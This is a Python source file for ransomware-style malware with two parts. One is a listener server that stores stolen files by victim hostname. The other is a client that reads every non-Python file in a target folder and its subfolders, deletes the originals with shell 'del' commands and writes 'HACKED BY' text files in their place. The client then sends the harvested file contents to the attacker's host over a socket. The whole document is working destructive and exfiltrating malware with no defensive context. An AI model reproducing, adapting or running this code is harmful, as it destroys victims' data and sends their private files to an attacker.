import socket
import ast
import os
import subprocess

class AttackingServer:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port

    def get_all_data(self, client_sock):
        data = ""
        test = 0
        while True:
            test += 1
            lit_msg = client_sock.recv(8192).decode()
            if len(lit_msg) <= 0: break
            data += lit_msg
        print(test)
        return data

    def start(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind((self.ip, self.port))
        server.listen(5)

        while True:
            print("Waiting for connection....")
            #Waits for the connection
            client_socket, ipaddress = server.accept()
            print(f"Connection has been established with {ipaddress}")

            full_msg = self.get_all_data(client_socket)
            #Every file will land in "full_msg" as a dictionary, so we have an identical assignment

            alle_dateien = ast.literal_eval(full_msg)
            #This makes it to a dictionary
            os.system(f"mkdir {alle_dateien['hostname']}")
            #This is the hostname of the target and it's being used for the directory name
            os.chdir(f"{alle_dateien['hostname']}")

            for datei, inhalt in alle_dateien.items():
                if datei == "hostname": continue
                if datei.endswith(".txt"):
                    with open(datei, "a+") as file:
                        file.write(str(inhalt))

                else:
                    with open(datei, "ab") as file:
                        file.write(inhalt)
            #This stores all the files in that directory


class RansomClient:
    def __init__(self, ip, port, path, hacked_by):
        self.ip = ip
        self.port = port
        self.path = path
        self.hacker = hacked_by
        self.alle_dateien = None

        command = subprocess.run(["hostname"], capture_output=True).stdout.decode()
        #This is the hostname of the target

        cmd = command.replace("\r\n", "")
        self.alle_dateien = {"hostname": cmd, }
        #This gets all the information of the data

    def hacked_by_someone(self):
        #Overwrites the file with whatever you want
        data = ""
        zahlen = [zahl for zahl in range(0, 308, 8)]
        #This is for the amount of coloums
        for x in range(1, 301):
            data += f"HACKED BY {self.hacker} - "
            #Anything can be used for this hack
            if x in zahlen:
                data += "\n"
        return data

    def hacked_files(self, all_data):
        #Renames all the files
        for file in all_data:
            data = ''.join(reversed(file))
            lst = []
            value = False
            for x in data:
                if value is True: continue
                lst.append(x)
                if "." == x:
                    #"." is there to grip from the backside
                    value = True
            #All the files will be opened but before I have to set up the filenames
            lst.remove(".")
            endung = ""
            for i in range(len(lst) - 1, -1, -1):
                endung += lst[i]

            datei = file.split(f"{endung}")
            filename = datei[0]
            os.system(f'del "{file}"')
            new_endung = f"{filename}txt"
            with open(new_endung, "w+") as the_file:
                text = self.hacked_by_someone()
                the_file.write(text)
                # The files will be renamed

    def all_data(self, filename, rwx):
        if rwx == "r+":
            with open(filename, "r+") as file:
                content = file.readlines()

                self.alle_dateien[filename] = content
                # Same process as in the previous ones

        elif rwx == "rb":
            with open(filename, "rb") as file:
                content = b""
                for line in file:
                    content += line

                self.alle_dateien[filename] = content

    def start(self):
        os.chdir(rf"{self.path}")
        #This gets the hostname of the target
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((self.ip, self.port))

        path = os.listdir()
        lst = path.copy()
        dateien = []
        directorys = []
        for dateiname in lst:
            if os.path.isfile(dateiname):
                if dateiname.endswith(".py"): continue
                dateien.append(dateiname)
                #Looks for the files in that path
        for endung in dateien:
            print(endung)
            if endung.endswith(".txt"):
                self.all_data(endung, "r+")

            self.all_data(endung, "rb")

        for direct_file in lst:
            if os.path.isdir(direct_file):
                directorys.append(direct_file)
                #Looks for a directory in that path
        self.hacked_files(dateien)
        file_name_of_dir = []
        directory_in_list = []
        print(directorys)
        if directorys:
            for name in directorys:
                print(name)
                os.chdir(name)
                list_dir = os.listdir()
                #This gets into the folder and looks for files
                print(list_dir)
                for each_name in list_dir:
                    if os.path.isfile(each_name):
                        file_name_of_dir.append(each_name)
                        print(f"\n{each_name}\n")
                        if each_name.endswith(".txt"):
                            self.all_data(each_name, "r+")
                                #Same process as in the previous ones

                        self.all_data(each_name, "rb")
                    if os.path.isdir(each_name):
                        directory_in_list.append(each_name)


                    #The function will kill some lines of code. I hope you like it
                self.hacked_files(list_dir)
                os.chdir(self.path)
            print(directory_in_list)
        client.send(str(self.alle_dateien).encode())